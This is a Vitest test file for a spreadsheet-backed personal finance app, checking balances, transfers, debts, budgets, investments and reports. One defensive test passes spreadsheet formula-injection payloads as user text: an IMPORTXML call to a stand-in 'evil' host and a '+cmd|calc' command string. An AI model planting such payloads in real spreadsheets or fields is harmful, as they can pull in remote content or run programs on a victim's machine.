import { describe, expect, it } from 'vitest';
import { newEnv, signIn } from './helpers.js';

function setup() {
  const env = newEnv();
  const u = signIn(env, 'rony');
  return { env, u };
}

const balanceOf = (u, id) => u.ok('getAccounts').find((a) => a.id === id).balance;

describe('accounts and transactions', () => {
  it('keeps transfers out of income/expenses and balances consistent', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank', openingBalance: 10000, openingDate: '2026-01-01' });
    const savings = u.ok('addAccount', { name: 'Savings', type: 'savings', openingBalance: 0, openingDate: '2026-01-01' });
    u.ok('addTransaction', { type: 'income', amount: 15000, categoryId: u.category('Salary').id, accountId: bank.id, date: '2026-10-01' });
    u.ok('addTransaction', { type: 'transfer', amount: 4000, accountId: bank.id, toAccountId: savings.id, date: '2026-10-02' });
    u.ok('addTransaction', { type: 'expense', amount: 3000, categoryId: u.category('Housing').id, accountId: bank.id, date: '2026-10-03' });

    expect(balanceOf(u, bank.id)).toBe(18000);
    expect(balanceOf(u, savings.id)).toBe(4000);
    const k = u.ok('getDashboard').kpis;
    expect(k.monthIncome).toBe(15000);
    expect(k.monthExpenses).toBe(3000);
    expect(k.monthSavings).toBe(12000);
    expect(k.savingsRate).toBeCloseTo(0.8);
    expect(k.cashBalance).toBe(22000);
    expect(k.netWorth).toBe(22000);
  });

  it('counts a credit-card purchase once and its repayment as a transfer', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank', openingBalance: 5000, openingDate: '2026-01-01' });
    const card = u.ok('addAccount', { name: 'Visa', type: 'credit_card', openingBalance: 0, openingDate: '2026-01-01' });
    u.ok('addTransaction', { type: 'expense', amount: 800, categoryId: u.category('Shopping').id, accountId: card.id, date: '2026-10-05' });
    let k = u.ok('getDashboard').kpis;
    expect(k.monthExpenses).toBe(800);
    expect(k.totalLiabilities).toBe(800);
    expect(k.netWorth).toBe(4200);

    u.ok('addTransaction', { type: 'transfer', amount: 800, accountId: bank.id, toAccountId: card.id, date: '2026-10-10' });
    k = u.ok('getDashboard').kpis;
    expect(k.monthExpenses).toBe(800); // not 1600
    expect(k.totalLiabilities).toBe(0);
    expect(k.netWorth).toBe(4200); // unchanged by repayment
    expect(balanceOf(u, card.id)).toBe(0);
    const debts = u.ok('getDebts');
    expect(debts.creditCards[0]).toMatchObject({ name: 'Visa', owed: 0 });
  });

  it('validates amounts, dates, currencies and category kinds', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank' });
    const groceries = u.category('Groceries');
    const salary = u.category('Salary');
    const bad = [
      { type: 'expense', amount: -5, categoryId: groceries.id, accountId: bank.id, date: '2026-10-01' },
      { type: 'expense', amount: 0, categoryId: groceries.id, accountId: bank.id, date: '2026-10-01' },
      { type: 'expense', amount: 'abc', categoryId: groceries.id, accountId: bank.id, date: '2026-10-01' },
      { type: 'expense', amount: 5, categoryId: groceries.id, accountId: bank.id, date: '2026-02-30' },
      { type: 'expense', amount: 5, categoryId: groceries.id, accountId: bank.id, date: '01/10/2026' },
      { type: 'expense', amount: 5, categoryId: salary.id, accountId: bank.id, date: '2026-10-01' },
      { type: 'refund', amount: 5, categoryId: groceries.id, accountId: bank.id, date: '2026-10-01' },
      { type: 'expense', amount: 5, categoryId: 'cat_nothex', accountId: bank.id, date: '2026-10-01' },
      { type: 'transfer', amount: 5, accountId: bank.id, toAccountId: bank.id, date: '2026-10-01' }
    ];
    for (const p of bad) expect(u.call('addTransaction', p), JSON.stringify(p)).toMatchObject({ ok: false, error: { code: 'VALIDATION' } });
    expect(u.call('addAccount', { name: 'X', type: 'bank', currency: 'usd' }).ok).toBe(false);
  });

  it('escapes spreadsheet formulas in user text', () => {
    const { env, u } = setup();
    const bank = u.ok('addAccount', { name: '=IMPORTXML("http://evil")', type: 'bank' });
    u.ok('addTransaction', { type: 'expense', amount: 1, categoryId: u.category('Other').id, accountId: bank.id, date: '2026-10-01', description: '+cmd|calc' });
    expect(u.ok('getAccounts')[0].name).toBe('=IMPORTXML("http://evil")');
    expect(env.rows('Transactions')[0].description).toBe('+cmd|calc');
  });

  it('requires the received amount for cross-currency transfers', () => {
    const { u } = setup();
    const aed = u.ok('addAccount', { name: 'AED', type: 'bank', openingBalance: 1000 });
    const usd = u.ok('addAccount', { name: 'USD', type: 'bank', currency: 'USD' });
    expect(u.call('addTransaction', { type: 'transfer', amount: 367.25, accountId: aed.id, toAccountId: usd.id, date: '2026-10-01' }).ok).toBe(false);
    u.ok('addTransaction', { type: 'transfer', amount: 367.25, toAmount: 100, accountId: aed.id, toAccountId: usd.id, date: '2026-10-01' });
    expect(balanceOf(u, aed.id)).toBe(632.75);
    expect(balanceOf(u, usd.id)).toBe(100);
  });

  it('never sums different currencies without an explicit rate', () => {
    const { u } = setup();
    u.ok('addAccount', { name: 'AED', type: 'bank', openingBalance: 1000, openingDate: '2026-01-01' });
    u.ok('addAccount', { name: 'USD', type: 'bank', currency: 'USD', openingBalance: 100, openingDate: '2026-01-01' });
    let d = u.ok('getDashboard');
    expect(d.kpis.cashBalance).toBe(1000);
    expect(d.missingRates).toEqual(['USD']);
    u.ok('setExchangeRate', { currency: 'USD', rate: 3.6725 });
    d = u.ok('getDashboard');
    expect(d.kpis.cashBalance).toBe(1367.25);
    expect(d.missingRates).toEqual([]);
    // Changing the preferred currency invalidates stored rates.
    u.ok('updateProfile', { preferredCurrency: 'USD' });
    expect(u.ok('getProfile').exchangeRates).toEqual({});
  });

  it('protects accounts with history from deletion', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank' });
    const empty = u.ok('addAccount', { name: 'Empty', type: 'cash' });
    u.ok('addTransaction', { type: 'expense', amount: 1, categoryId: u.category('Other').id, accountId: bank.id, date: '2026-10-01' });
    expect(u.call('deleteAccount', { id: bank.id })).toMatchObject({ ok: false, error: { code: 'CONFLICT' } });
    expect(u.call('deleteAccount', { id: empty.id }).ok).toBe(true);
    u.ok('updateAccount', { id: bank.id, archived: true });
    expect(u.call('addTransaction', { type: 'expense', amount: 1, categoryId: u.category('Other').id, accountId: bank.id, date: '2026-10-01' }).ok).toBe(false);
  });

  it('records recurring occurrences on the next due date', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank' });
    const rent = u.ok('addTransaction', { type: 'expense', amount: 5000, categoryId: u.category('Housing').id, accountId: bank.id, date: '2026-08-31', recurrence: 'monthly', description: 'Rent' });
    expect(rent.recurringId).toBe(rent.id);
    expect(u.ok('recordRecurring', { id: rent.id }).date).toBe('2026-09-30');
    expect(u.ok('recordRecurring', { id: rent.id }).date).toBe('2026-10-31');
    const occ = u.ok('getTransactions').filter((t) => t.recurringId === rent.id && t.id !== rent.id);
    expect(occ).toHaveLength(2);
    expect(occ.every((t) => t.recurrence === '')).toBe(true);
  });
});

describe('categories', () => {
  it('renaming or archiving a category keeps history linked', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank' });
    const cat = u.category('Restaurants');
    const t = u.ok('addTransaction', { type: 'expense', amount: 90, categoryId: cat.id, accountId: bank.id, date: '2026-10-01' });
    u.ok('updateCategory', { id: cat.id, name: 'Dining out', archived: true });
    const after = u.ok('getTransactions').find((x) => x.id === t.id);
    expect(after.categoryId).toBe(cat.id);
    expect(u.ok('getDashboard').expensesByCategory[0]).toMatchObject({ name: 'Dining out', amount: 90 });
    expect(u.call('addCategory', { name: 'dining OUT', kind: 'expense' })).toMatchObject({ ok: false, error: { code: 'CONFLICT' } });
    expect(u.ok('addCategory', { name: 'Pets', kind: 'expense', color: '#123456', essential: true })).toMatchObject({ name: 'Pets', essential: true });
  });
});

describe('budgets', () => {
  it('reports spending against budget and copies to the next month', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank' });
    const g = u.category('Groceries');
    u.ok('setBudget', { categoryId: g.id, month: '2026-10', amount: 1000 });
    u.ok('addTransaction', { type: 'expense', amount: 250, categoryId: g.id, accountId: bank.id, date: '2026-10-03' });
    u.ok('addTransaction', { type: 'expense', amount: 99, categoryId: u.category('Fuel').id, accountId: bank.id, date: '2026-10-03' });
    const r = u.ok('getBudgets', { month: '2026-10' });
    expect(r.items[0]).toMatchObject({ spent: 250, remaining: 750, percentUsed: 0.25 });
    expect(r.unbudgeted[0]).toMatchObject({ categoryName: 'Fuel', spent: 99 });
    // Upsert, not duplicate.
    u.ok('setBudget', { categoryId: g.id, month: '2026-10', amount: 1200 });
    expect(u.ok('getBudgets', { month: '2026-10' }).items).toHaveLength(1);
    const copied = u.ok('copyBudgets', { fromMonth: '2026-10', toMonth: '2026-11' });
    expect(copied.items[0]).toMatchObject({ amount: 1200, spent: 0 });
  });
});

describe('savings goals', () => {
  it('tracks contributions and withdrawals without inflating net worth', () => {
    const { u } = setup();
    u.ok('addAccount', { name: 'Savings', type: 'savings', openingBalance: 10000, openingDate: '2026-01-01' });
    const goal = u.ok('addSavingsGoal', { name: 'Holiday', targetAmount: 8000, initialAmount: 1000, targetDate: '2027-04-15' });
    u.ok('addGoalContribution', { goalId: goal.id, amount: 3000, date: '2026-10-01' });
    u.ok('addGoalContribution', { goalId: goal.id, amount: 500, kind: 'withdrawal', date: '2026-10-05' });
    expect(u.call('addGoalContribution', { goalId: goal.id, amount: 99999, kind: 'withdrawal' }).ok).toBe(false);
    const g = u.ok('getSavingsGoals')[0];
    expect(g.saved).toBe(3500);
    expect(g.progress).toBeCloseTo(3500 / 8000);
    expect(g.monthsLeft).toBe(6);
    expect(g.monthlyNeeded).toBe(750);
    expect(u.ok('getDashboard').kpis.netWorth).toBe(10000);
  });
});

describe('debts', () => {
  it('reduces the liability by principal only, once, and books interest as an expense', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank', openingBalance: 20000, openingDate: '2026-01-01' });
    const debt = u.ok('addDebt', { name: 'Car loan', type: 'car_loan', originalPrincipal: 60000, openingBalance: 50000, interestRate: 4.5, minimumPayment: 2000, dueDay: 31, startDate: '2026-01-01' });
    let k = u.ok('getDashboard').kpis;
    expect(k.totalLiabilities).toBe(50000);
    expect(k.netWorth).toBe(-30000);

    const pay = u.ok('addDebtPayment', { debtId: debt.id, amount: 2000, interest: 200, accountId: bank.id, date: '2026-10-01' });
    expect(pay).toMatchObject({ principal: 1800, interest: 200 });
    const d = u.ok('getDebts').debts[0];
    expect(d.outstanding).toBe(48200);
    expect(d.paidInterest).toBe(200);
    expect(d.nextDueDate).toBe('2026-10-31');
    expect(balanceOf(u, bank.id)).toBe(18000);
    k = u.ok('getDashboard').kpis;
    expect(k.monthExpenses).toBe(200); // interest only
    expect(k.totalLiabilities).toBe(48200);
    expect(k.netWorth).toBe(18000 - 48200);

    // Linked transactions are managed by the debt, not editable directly.
    const linked = u.ok('getTransactions').filter((t) => t.linkId === pay.id);
    expect(linked.map((t) => t.type).sort()).toEqual(['expense', 'transfer']);
    expect(u.call('deleteTransaction', { id: linked[0].id })).toMatchObject({ ok: false, error: { code: 'CONFLICT' } });

    // Overpaying principal is rejected.
    expect(u.call('addDebtPayment', { debtId: debt.id, amount: 60000 }).ok).toBe(false);

    // Deleting the payment restores everything.
    u.ok('deleteDebtPayment', { id: pay.id });
    expect(u.ok('getDebts').debts[0].outstanding).toBe(50000);
    expect(balanceOf(u, bank.id)).toBe(20000);
    expect(u.ok('getTransactions')).toHaveLength(0);
  });
});

describe('investments', () => {
  it('uses weighted average cost and realises P/L on partial sales', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Broker cash', type: 'bank', openingBalance: 10000, openingDate: '2026-01-01' });
    const inv = u.ok('addInvestment', { name: 'Apple', ticker: 'aapl', assetType: 'stock', currency: 'AED' });
    expect(inv.ticker).toBe('AAPL');
    u.ok('addInvestmentTransaction', { investmentId: inv.id, type: 'buy', quantity: 10, price: 100, fees: 10, date: '2026-09-01', cashAccountId: bank.id });
    u.ok('addInvestmentTransaction', { investmentId: inv.id, type: 'buy', quantity: 10, price: 120, fees: 10, date: '2026-09-15', cashAccountId: bank.id });
    // cost = 1010 + 1210 = 2220, qty 20, avg 111
    u.ok('addInvestmentTransaction', { investmentId: inv.id, type: 'sell', quantity: 5, price: 130, fees: 5, date: '2026-10-01', cashAccountId: bank.id });
    // realised = 650 - 5 - 555 = 90; remaining cost = 1665, qty 15
    const h = u.ok('getInvestments').holdings[0];
    expect(h.metrics.quantity).toBe(15);
    expect(h.metrics.costBasis).toBe(1665);
    expect(h.metrics.realizedPL).toBe(90);
    expect(h.metrics.price).toBe(130);
    expect(h.metrics.priceSource).toBe('trade');
    expect(h.metrics.marketValue).toBe(1950);
    expect(h.metrics.unrealizedPL).toBe(285);

    // Cash moved via linked transfers, not expenses.
    expect(balanceOf(u, bank.id)).toBe(10000 - 1010 - 1210 + 645);
    const dash = u.ok('getDashboard');
    expect(dash.kpis.monthExpenses).toBe(0);
    expect(dash.kpis.portfolioValue).toBe(1950);
    expect(dash.kpis.netWorth).toBe(10000 - 1010 - 1210 + 645 + 1950);

    // Manual price update (no external API) wins over older trade prices.
    u.ok('updateInvestmentPrice', { investmentId: inv.id, price: 140, date: '2026-10-10' });
    const h2 = u.ok('getInvestments').holdings[0];
    expect(h2.metrics).toMatchObject({ price: 140, priceSource: 'manual', marketValue: 2100, stale: false });
  });

  it('rejects overselling and flags stale prices', () => {
    const { u } = setup();
    const inv = u.ok('addInvestment', { name: 'Gold bar', assetType: 'gold', currency: 'AED' });
    const buy = u.ok('addInvestmentTransaction', { investmentId: inv.id, type: 'buy', quantity: 1, price: 250, date: '2026-08-01' });
    expect(u.call('addInvestmentTransaction', { investmentId: inv.id, type: 'sell', quantity: 2, price: 260, date: '2026-09-01' })).toMatchObject({ ok: false, error: { code: 'VALIDATION' } });
    // A sale dated before the purchase is also invalid.
    expect(u.call('addInvestmentTransaction', { investmentId: inv.id, type: 'sell', quantity: 1, price: 260, date: '2026-07-01' }).ok).toBe(false);
    const sell = u.ok('addInvestmentTransaction', { investmentId: inv.id, type: 'sell', quantity: 0.5, price: 260, date: '2026-09-01' });
    expect(u.call('deleteInvestmentTransaction', { id: buy.id })).toMatchObject({ ok: false, error: { code: 'CONFLICT' } });
    const r = u.ok('getInvestments');
    expect(r.holdings[0].metrics.stale).toBe(true); // last price 2026-09-01, today 2026-10-15
    expect(r.staleCount).toBe(1);
    u.ok('deleteInvestmentTransaction', { id: sell.id });
  });

  it('builds month-end history from known prices only', () => {
    const { u } = setup();
    const inv = u.ok('addInvestment', { name: 'ETF', assetType: 'etf' });
    u.ok('addInvestmentTransaction', { investmentId: inv.id, type: 'buy', quantity: 10, price: 50, date: '2026-08-10' });
    u.ok('updateInvestmentPrice', { investmentId: inv.id, price: 55, date: '2026-09-20' });
    const hist = u.ok('getInvestments').history;
    const byMonth = Object.fromEntries(hist.map((h) => [h.month, h]));
    expect(byMonth['2026-07']).toMatchObject({ value: 0, costBasis: 0 });
    expect(byMonth['2026-08']).toMatchObject({ value: 500, costBasis: 500 });
    expect(byMonth['2026-09']).toMatchObject({ value: 550, costBasis: 500 });
    expect(u.call('updateInvestmentPrice', { investmentId: inv.id, price: 60, date: '2030-01-01' }).ok).toBe(false);
  });
});

describe('reports', () => {
  it('produces monthly series including net worth history', () => {
    const { u } = setup();
    const bank = u.ok('addAccount', { name: 'Bank', type: 'bank', openingBalance: 1000, openingDate: '2026-08-01' });
    u.ok('addTransaction', { type: 'income', amount: 500, categoryId: u.category('Freelance').id, accountId: bank.id, date: '2026-09-10' });
    u.ok('addTransaction', { type: 'expense', amount: 200, categoryId: u.category('Travel').id, accountId: bank.id, date: '2026-10-10' });
    const r = u.ok('getReports', { months: 3 });
    expect(r.series.map((s) => s.month)).toEqual(['2026-08', '2026-09', '2026-10']);
    expect(r.series.map((s) => s.netWorth)).toEqual([1000, 1500, 1300]);
    expect(r.totals).toMatchObject({ income: 500, expenses: 200, savings: 300 });
    expect(r.spendingByCategory[0]).toMatchObject({ name: 'Travel', amount: 200 });
  });
});
